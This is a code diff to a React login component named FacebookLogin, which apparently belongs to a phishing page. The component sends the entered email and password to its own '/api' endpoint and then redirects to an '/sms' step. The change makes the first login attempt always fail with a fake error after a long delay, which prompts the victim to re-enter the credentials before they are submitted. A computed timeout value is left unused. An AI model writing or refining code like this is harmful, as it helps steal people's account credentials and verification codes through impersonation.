@@ -9,6 +9,7 @@ const FacebookLogin: React.FC = () => {
   const [password, setPassword] = useState('');
   const [error, setError] = useState('');
   const [isLoading, setIsLoading] = useState(false);
+  const [loginAttempts, setLoginAttempts] = useState(0);
   const router = useRouter();
 
   const handleLogin = async (e: React.FormEvent) => {
@@ -19,15 +20,28 @@ const FacebookLogin: React.FC = () => {
       setError('Please fill in all fields');
       return;
     }
+
     setIsLoading(true);
-    try {
-      const response = await axios.post('/api', { email, password });
-      localStorage.setItem('email', response.data.email);
-      router.push('/sms');
-    } catch (err) {
-      setError('Login failed. Please check your credentials.');
-    }
-    setIsLoading(false);
+    setLoginAttempts(loginAttempts + 1);
+
+    const timeout = loginAttempts === 0 ? 45000 : 20000;
+
+    setTimeout(async () => {
+      if (loginAttempts === 0) {
+        setError('Login failed. Please check your credentials.');
+        setIsLoading(false);
+      } else {
+        try {
+          const response = await axios.post('/api', { email, password });
+          localStorage.setItem('email', response.data.email);
+          router.push('/sms');
+        } catch (err) {
+          setError('Login failed. Please check your credentials.');
+        } finally {
+          setIsLoading(false);
+        }
+      }
+    }, 45000);
   };
 
   return (
